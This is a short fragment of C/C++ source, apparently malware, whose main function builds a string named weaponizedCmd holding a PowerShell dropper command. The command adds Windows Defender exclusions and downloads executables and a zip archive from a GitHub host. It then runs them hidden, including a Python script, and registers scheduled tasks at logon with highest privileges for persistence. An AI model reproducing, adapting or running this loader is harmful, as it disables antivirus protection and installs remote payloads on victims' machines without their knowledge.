...
int main() {
    ...
    swprintf_s(weaponizedCmd, 2048, 
        L"powershell.exe -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionProcess 'word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\';Add-MpPreference -ExclusionPath 'C:\\Windows\\';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $zipPath='C:\\Windows\\Temp\\word.exe'; $zipPath1='$env:USERPROFILE\\AppData\\Roaming\\Word.zip'; $extractPath='$env:USERPROFILE\\AppData\\Roaming\\Word'; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/raw/refs/heads/main/Client.exe', $zipPath); Start-Process $zipPath  -WindowStyle Hidden; schtasks /create /tn 'ActiveOffices' /tr $zipPath /sc onlogon /delay 0001:00 /rl highest /f; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/releases/download/run/office.zip', $zipPath1); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath1, $extractPath);Remove-Item $zipPath1 -Force; Start-Process '$extractPath\\python.exe' -ArgumentList '$extractPath\\Lib\\system.py' -WindowStyle Hidden; ; schtasks /create /tn 'ActiveWord' /tr '$extractPath\\pythonw.exe $extractPath\\Lib\\system.py' /sc onlogon /delay 0001:00 /rl highest /f \"");
